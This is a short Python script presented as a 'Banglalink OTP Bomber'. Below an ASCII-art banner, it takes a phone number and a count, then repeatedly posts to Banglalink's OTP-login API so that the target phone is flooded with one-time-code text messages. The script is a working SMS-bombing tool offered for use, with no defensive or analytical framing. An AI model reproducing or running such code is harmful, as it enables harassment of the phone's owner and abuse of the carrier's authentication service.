import requests

import os

import sys

import time

os.system("clear")

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

logo = (red+ """NNNNNNNN        NNNNNNNN                             d::::::d  iiii                          
N:::::::N       N::::::N                             d::::::d i::::i                         
N::::::::N      N::::::N                             d::::::d  iiii                          
N:::::::::N     N::::::N                             d:::::d                                 
N::::::::::N    N::::::N  aaaaaaaaaaaaa      ddddddddd:::::d iiiiiii    mmmmmmm    mmmmmmm   
N:::::::::::N   N::::::N  a::::::::::::a   dd::::::::::::::d i:::::i  mm:::::::m  m:::::::mm 
N:::::::N::::N  N::::::N  aaaaaaaaa:::::a d::::::::::::::::d  i::::i m::::::::::mm::::::::::m
N::::::N N::::N N::::::N           a::::ad:::::::ddddd:::::d  i::::i m::::::::::::::::::::::m
N::::::N  N::::N:::::::N    aaaaaaa:::::ad::::::d    d:::::d  i::::i m:::::mmm::::::mmm:::::m
N::::::N   N:::::::::::N  aa::::::::::::ad:::::d     d:::::d  i::::i m::::m   m::::m   m::::m
N::::::N    N::::::::::N a::::aaaa::::::ad:::::d     d:::::d  i::::i m::::m   m::::m   m::::m
N::::::N     N:::::::::Na::::a    a:::::ad:::::d     d:::::d  i::::i m::::m   m::::m   m::::m
N::::::N      N::::::::Na::::a    a:::::ad::::::ddddd::::::ddi::::::im::::m   m::::m   m::::m
N::::::N       N:::::::Na:::::aaaa::::::a d:::::::::::::::::di::::::im::::m   m::::m   m::::m
N::::::N        N::::::N a::::::::::aa:::a d:::::::::ddd::::di::::::im::::m   m::::m   m::::m
NNNNNNNN         NNNNNNN  aaaaaaaaaa  aaaa  ddddddddd   dddddiiiiiiiimmmmmm   mmmmmm   mmmmmm
                                                                                             
""")

line = (cyan+"∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞")

name = (purple+"""
Created By   : Nadim Ahamed 
Tools        : My Banglalink OTP Bomber
Use          : Only Banglalink SIM 
Coded By     : NADIM
""")

print(logo)

print(line)

print(name)

print(line)

number=str(input(yellow+"\n[➙] Enter Your Number : "))

body2 = {"mobile":number}

url2 = "https://webbecm.banglalink.net/api/v1/user/otp-login/request"


amount=int(input(blue+"\n[➙]Enter Your Amount: "))

for i in range(amount):
    resp = requests.post(url2, data=body2)
    print(str(i+1)+green+" ➙SMS Sent 😈✅")

  	  